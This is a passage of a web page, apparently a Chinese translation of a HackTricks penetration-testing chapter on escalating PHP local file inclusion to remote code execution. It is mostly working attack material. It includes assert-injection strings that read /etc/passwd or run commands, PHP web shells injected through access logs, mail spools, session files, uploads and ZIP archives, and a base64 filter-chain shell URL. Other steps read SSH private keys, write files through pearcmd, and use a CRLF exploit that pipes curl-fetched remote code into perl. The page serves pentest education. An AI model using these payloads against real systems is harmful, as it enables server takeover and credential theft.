<p>检查更多可能的 <a href="https://www.php.net/manual/en/wrappers.php"><strong>协议以包含在这里</strong></a><strong>:</strong></p>
<ul>
<li><a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory">php://memory and php://temp</a> — 在内存或临时文件中写入（不确定这在文件包含攻击中如何有用）</li>
<li><a href="https://www.php.net/manual/en/wrappers.file.php">file://</a> — 访问本地文件系统</li>
<li><a href="https://www.php.net/manual/en/wrappers.http.php">http://</a> — 访问 HTTP(s) URL</li>
<li><a href="https://www.php.net/manual/en/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URL</li>
<li><a href="https://www.php.net/manual/en/wrappers.compression.php">zlib://</a> — 压缩流</li>
<li><a href="https://www.php.net/manual/en/wrappers.glob.php">glob://</a> — 查找匹配模式的路径名（它不返回任何可打印的内容，因此在这里并不真正有用）</li>
<li><a href="https://www.php.net/manual/en/wrappers.ssh2.php">ssh2://</a> — 安全外壳 2</li>
<li><a href="https://www.php.net/manual/en/wrappers.audio.php">ogg://</a> — 音频流（不适合读取任意文件）</li>
</ul>
<h2 id="通过-php-的-assert-进行-lfi"><a class="header" href="#通过-php-的-assert-进行-lfi">通过 PHP 的 'assert' 进行 LFI</a></h2>
<p>在处理 'assert' 函数时，PHP 中的本地文件包含（LFI）风险显著较高，因为它可以在字符串中执行代码。如果输入包含目录遍历字符如 ".." 被检查但未正确清理，这尤其成问题。</p>
<p>例如，PHP 代码可能被设计为防止目录遍历，如下所示：</p>
<pre><code class="language-bash">assert("strpos('$file', '..') === false") or die("");
</code></pre>
<p>虽然这旨在阻止遍历，但不经意间创建了代码注入的向量。为了利用这一点读取文件内容，攻击者可以使用：</p>
<pre><code class="language-plaintext">' and die(highlight_file('/etc/passwd')) or '
</code></pre>
<p>同样，对于执行任意系统命令，可以使用：</p>
<pre><code class="language-plaintext">' and die(system("id")) or '
</code></pre>
<p>重要的是要<strong>对这些有效载荷进行URL编码</strong>。</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入<a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a>服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金发布和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作吧！</p>
<h2 id="php盲路径遍历"><a class="header" href="#php盲路径遍历">PHP盲路径遍历</a></h2>
<p>{% hint style="warning" %}
此技术适用于您<strong>控制</strong>一个<strong>PHP函数</strong>的<strong>文件路径</strong>的情况，该函数将<strong>访问一个文件</strong>但您看不到文件的内容（如简单调用**<code>file()</code>**）但内容未显示。
{% endhint %}</p>
<p>在<a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html"><strong>这篇精彩的文章</strong></a>中解释了如何通过PHP过滤器滥用盲路径遍历以<strong>通过错误oracle提取文件内容</strong>。</p>
<p>总之，该技术使用**"UCS-4LE"编码<strong>使文件内容变得如此</strong>庞大**，以至于<strong>打开</strong>该文件的<strong>PHP函数</strong>将触发一个<strong>错误</strong>。</p>
<p>然后，为了泄露第一个字符，使用过滤器**<code>dechunk</code><strong>，以及其他如</strong>base64<strong>或</strong>rot13**，最后使用过滤器<strong>convert.iconv.UCS-4.UCS-4LE</strong>和<strong>convert.iconv.UTF16.UTF-16BE</strong>来<strong>在开头放置其他字符并泄露它们</strong>。</p>
<p><strong>可能存在漏洞的函数</strong>：<code>file_get_contents</code>, <code>readfile</code>, <code>finfo-&gt;file</code>, <code>getimagesize</code>, <code>md5_file</code>, <code>sha1_file</code>, <code>hash_file</code>, <code>file</code>, <code>parse_ini_file</code>, <code>copy</code>, <code>file_put_contents (仅限目标只读)</code>, <code>stream_get_contents</code>, <code>fgets</code>, <code>fread</code>, <code>fgetc</code>, <code>fgetcsv</code>, <code>fpassthru</code>, <code>fputs</code></p>
<p>有关技术细节，请查看上述文章！</p>
<h2 id="lfi2rce"><a class="header" href="#lfi2rce">LFI2RCE</a></h2>
<h3 id="远程文件包含"><a class="header" href="#远程文件包含">远程文件包含</a></h3>
<p>如前所述，<a href="./#remote-file-inclusion"><strong>请点击此链接</strong></a>。</p>
<h3 id="通过apachenginx日志文件"><a class="header" href="#通过apachenginx日志文件">通过Apache/Nginx日志文件</a></h3>
<p>如果Apache或Nginx服务器在包含函数中<strong>易受LFI攻击</strong>，您可以尝试访问**<code>/var/log/apache2/access.log</code>或<code>/var/log/nginx/access.log</code><strong>，在</strong>用户代理<strong>或</strong>GET参数<strong>中设置一个php shell，如</strong><code>&lt;?php system($_GET['c']); ?&gt;</code>**并包含该文件。</p>
<p>{% hint style="warning" %}
请注意，如果您为shell使用双引号而不是<strong>单引号</strong>，双引号将被修改为字符串"<em><strong>quote;</strong></em>"，<strong>PHP将在那里抛出错误</strong>，并且<strong>不会执行其他任何内容</strong>。</p>
<p>此外，请确保<strong>正确编写有效载荷</strong>，否则PHP每次尝试加载日志文件时都会出错，您将没有第二次机会。
{% endhint %}</p>
<p>这也可以在其他日志中完成，但**请小心，<strong>日志中的代码可能被URL编码，这可能会破坏Shell。头部</strong>授权 "basic"**包含"用户:密码"的Base64编码，并在日志中解码。PHPShell可以插入到此头部中。<br />
其他可能的日志路径：</p>
<pre><code class="language-python">/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
</code></pre>
<p>Fuzzing wordlist: <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI</a></p>
<h3 id="通过电子邮件"><a class="header" href="#通过电子邮件">通过电子邮件</a></h3>
<p><strong>发送邮件</strong>到内部账户 (user@localhost)，包含你的 PHP 负载，如 <code>&lt;?php echo system($_REQUEST["cmd"]); ?&gt;</code>，并尝试包含用户的邮件，路径如 <strong><code>/var/mail/&lt;USERNAME&gt;</code></strong> 或 <strong><code>/var/spool/mail/&lt;USERNAME&gt;</code></strong></p>
<h3 id="通过-procfd"><a class="header" href="#通过-procfd">通过 /proc/*/fd/*</a></h3>
<ol>
<li>上传大量的 shell（例如：100）</li>
<li>包含 <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a>，其中 $PID = 进程的 PID（可以暴力破解），$FD 是文件描述符（也可以暴力破解）</li>
</ol>
<h3 id="通过-procselfenviron"><a class="header" href="#通过-procselfenviron">通过 /proc/self/environ</a></h3>
<p>像日志文件一样，在 User-Agent 中发送负载，它将反映在 /proc/self/environ 文件中</p>
<pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: &lt;?=phpinfo(); ?&gt;
</code></pre>
<h3 id="通过上传"><a class="header" href="#通过上传">通过上传</a></h3>
<p>如果您可以上传文件，只需在其中注入 shell 负载 (例如：<code>&lt;?php system($_GET['c']); ?&gt;</code>)。</p>
<pre><code>http://example.com/index.php?page=path/to/uploaded/file.png
</code></pre>
<p>为了保持文件的可读性，最好将其注入到图片/doc/pdf 的元数据中。</p>
<h3 id="通过-zip-文件上传"><a class="header" href="#通过-zip-文件上传">通过 ZIP 文件上传</a></h3>
<p>上传一个包含压缩 PHP shell 的 ZIP 文件并访问：</p>
<pre><code class="language-python">example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
</code></pre>
<h3 id="通过-php-会话"><a class="header" href="#通过-php-会话">通过 PHP 会话</a></h3>
<p>检查网站是否使用 PHP 会话 (PHPSESSID)</p>
<pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
</code></pre>
<p>在 PHP 中，这些会话存储在 <em>/var/lib/php5/sess\</em>[PHPSESSID]_ 文件中</p>
<pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
</code></pre>
<p>将 cookie 设置为 <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p>
<pre><code>login=1&amp;user=&lt;?php system("cat /etc/passwd");?&gt;&amp;pass=password&amp;lang=en_us.php
</code></pre>
<p>使用 LFI 包含 PHP 会话文件</p>
<pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
</code></pre>
<h3 id="通过-ssh"><a class="header" href="#通过-ssh">通过 ssh</a></h3>
<p>如果 ssh 处于活动状态，请检查正在使用的用户（/proc/self/status &amp; /etc/passwd），并尝试访问 <strong>&lt;HOME&gt;/.ssh/id_rsa</strong></p>
<h3 id="通过-vsftpd-日志"><a class="header" href="#通过-vsftpd-日志"><strong>通过</strong> <strong>vsftpd</strong> <em><strong>日志</strong></em></a></h3>
<p>FTP 服务器 vsftpd 的日志位于 <em><strong>/var/log/vsftpd.log</strong></em>。在存在本地文件包含（LFI）漏洞的情况下，并且可以访问暴露的 vsftpd 服务器，可以考虑以下步骤：</p>
<ol>
<li>在登录过程中将 PHP 有效负载注入到用户名字段中。</li>
<li>注入后，利用 LFI 从 <em><strong>/var/log/vsftpd.log</strong></em> 检索服务器日志。</li>
</ol>
<h3 id="通过-php-base64-过滤器使用-base64"><a class="header" href="#通过-php-base64-过滤器使用-base64">通过 php base64 过滤器（使用 base64）</a></h3>
<p>正如 <a href="https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64">这篇</a> 文章所示，PHP base64 过滤器只会忽略非 base64。您可以利用这一点绕过文件扩展名检查：如果您提供以 ".php" 结尾的 base64，它只会忽略 "." 并将 "php" 附加到 base64。以下是一个有效负载示例：</p>
<pre><code class="language-url">http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;"
</code></pre>
<h3 id="通过-php-过滤器无需文件"><a class="header" href="#通过-php-过滤器无需文件">通过 php 过滤器（无需文件）</a></h3>
<p>这个 <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"><strong>写作</strong></a> 解释了你可以使用 <strong>php 过滤器生成任意内容</strong> 作为输出。这基本上意味着你可以 <strong>生成任意的 php 代码</strong> 进行包含 <strong>而无需将其写入</strong> 文件。</p>
<p>{% content-ref url="lfi2rce-via-php-filters.md" %}
<a href="lfi2rce-via-php-filters.html">lfi2rce-via-php-filters.md</a>
{% endcontent-ref %}</p>
<h3 id="通过段错误"><a class="header" href="#通过段错误">通过段错误</a></h3>
<p><strong>上传</strong> 一个将被存储为 <strong>临时</strong> 文件在 <code>/tmp</code>，然后在 <strong>同一请求中</strong> 触发 <strong>段错误</strong>，然后 <strong>临时文件将不会被删除</strong>，你可以搜索它。</p>
<p>{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
<a href="lfi2rce-via-segmentation-fault.html">lfi2rce-via-segmentation-fault.md</a>
{% endcontent-ref %}</p>
<h3 id="通过-nginx-临时文件存储"><a class="header" href="#通过-nginx-临时文件存储">通过 Nginx 临时文件存储</a></h3>
<p>如果你发现了 <strong>本地文件包含</strong> 并且 <strong>Nginx</strong> 在 PHP 前面运行，你可能能够通过以下技术获得 RCE：</p>
<p>{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
<a href="lfi2rce-via-nginx-temp-files.html">lfi2rce-via-nginx-temp-files.md</a>
{% endcontent-ref %}</p>
<h3 id="通过-php_session_upload_progress"><a class="header" href="#通过-php_session_upload_progress">通过 PHP_SESSION_UPLOAD_PROGRESS</a></h3>
<p>如果你发现了 <strong>本地文件包含</strong> 即使你 <strong>没有会话</strong> 并且 <code>session.auto_start</code> 是 <code>Off</code>。如果你在 <strong>multipart POST</strong> 数据中提供 <strong><code>PHP_SESSION_UPLOAD_PROGRESS</code></strong>，PHP 将 <strong>为你启用会话</strong>。你可以利用这一点获得 RCE：</p>
<p>{% content-ref url="via-php_session_upload_progress.md" %}
<a href="via-php_session_upload_progress.html">via-php_session_upload_progress.md</a>
{% endcontent-ref %}</p>
<h3 id="通过-windows-中的临时文件上传"><a class="header" href="#通过-windows-中的临时文件上传">通过 Windows 中的临时文件上传</a></h3>
<p>如果你发现了 <strong>本地文件包含</strong> 并且服务器在 <strong>Windows</strong> 中运行，你可能会获得 RCE：</p>
<p>{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
<a href="lfi2rce-via-temp-file-uploads.html">lfi2rce-via-temp-file-uploads.md</a>
{% endcontent-ref %}</p>
<h3 id="通过-pearcmdphp--url-参数"><a class="header" href="#通过-pearcmdphp--url-参数">通过 <code>pearcmd.php</code> + URL 参数</a></h3>
<p>正如 <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"><strong>在这篇文章中解释的</strong></a>，脚本 <code>/usr/local/lib/phppearcmd.php</code> 在 php docker 镜像中默认存在。此外，可以通过 URL 向脚本传递参数，因为它表明如果 URL 参数没有 <code>=</code>，则应将其用作参数。</p>
<p>以下请求在 <code>/tmp/hello.php</code> 中创建一个内容为 <code>&lt;?=phpinfo()?&gt;</code> 的文件：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
</code></pre>
<p>{% endcode %}</p>
<p>以下利用CRLF漏洞获取RCE（来自<a href="https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1"><strong>这里</strong></a>）：</p>
<pre><code>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
</code></pre>
<h3 id="通过-phpinfo-file_uploads--on"><a class="header" href="#通过-phpinfo-file_uploads--on">通过 phpinfo() (file_uploads = on)</a></h3>
<p>如果你发现了 <strong>Local File Inclusion</strong> 并且有一个暴露 <strong>phpinfo()</strong> 的文件，且 file_uploads = on，你可以获得 RCE：</p>
<p>{% content-ref url="lfi2rce-via-phpinfo.md" %}
<a href="lfi2rce-via-phpinfo.html">lfi2rce-via-phpinfo.md</a>
{% endcontent-ref %}</p>
<h3 id="通过-compresszlib--php_stream_prefer_studio--路径泄露"><a class="header" href="#通过-compresszlib--php_stream_prefer_studio--路径泄露">通过 compress.zlib + <code>PHP_STREAM_PREFER_STUDIO</code> + 路径泄露</a></h3>
<p>如果你发现了 <strong>Local File Inclusion</strong> 并且你 <strong>可以提取临时文件的路径</strong>，但 <strong>服务器</strong> 正在 <strong>检查</strong> 要包含的 <strong>文件是否有 PHP 标记</strong>，你可以尝试通过这个 <strong>竞争条件</strong> 来 <strong>绕过该检查</strong>：</p>
<p>{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
<a href="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.html">lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md</a>
{% endcontent-ref %}</p>
<h3 id="通过永恒等待--暴力破解"><a class="header" href="#通过永恒等待--暴力破解">通过永恒等待 + 暴力破解</a></h3>
<p>如果你可以利用 LFI 来 <strong>上传临时文件</strong> 并使服务器 <strong>挂起</strong> PHP 执行，你可以 <strong>在数小时内暴力破解文件名</strong> 来找到临时文件：</p>
<p>{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
<a href="lfi2rce-via-eternal-waiting.html">lfi2rce-via-eternal-waiting.md</a>
{% endcontent-ref %}</p>
<h3 id="到致命错误"><a class="header" href="#到致命错误">到致命错误</a></h3>
<p>如果你包含任何文件 <code>/usr/bin/phar</code>、<code>/usr/bin/phar7</code>、<code>/usr/bin/phar.phar7</code>、<code>/usr/bin/phar.phar</code>。 (你需要包含同一个文件 2 次以引发该错误)。</p>
<p><strong>我不知道这有什么用，但可能会有用。</strong><br />
即使你导致 PHP 致命错误，上传的 PHP 临时文件也会被删除。</p>
<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>
<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal">PayloadsAllTheThings</a>\</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders">PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders</a></li>
</ul>
<p>{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作！</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/email-injections.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/file-inclusion/phar-deserialization.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/email-injections.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/file-inclusion/phar-deserialization.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
